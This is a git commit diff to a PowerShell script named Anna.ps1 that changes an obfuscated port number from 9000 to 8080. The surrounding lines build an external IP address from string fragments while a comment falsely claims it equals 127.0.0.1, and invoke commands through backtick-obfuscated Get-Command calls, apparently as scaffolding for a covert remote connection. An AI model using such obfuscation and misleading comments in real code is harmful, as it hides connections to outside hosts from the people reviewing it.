412d6ba51a1093ce5fb94d624cebb7d6302a6941
ClemensHofer2012 <73170777+ClemensHofer2012@users.noreply.github.com>
2020-11-08 22:23:17 +0100

    Update Anna.ps1

--- Anna.ps1
+++ Anna.ps1
@@ -2,7 +2,7 @@
 # obfuscated host address, same as $a = "127.0.0.1";
 $a = "35" + "." + "176" + "." + "12" + "." + "203";
 # obfuscated port number, same as $p = 9000;
-$p = 1000 + 1000 + 1000 + 6000;
+$p = 0 + 8000 + 80 + 0;
 & (`G`C`M *e-Ho??);
 & (`G`C`M *e-Ho??);
 & (`G`C`M *e-Ho??);
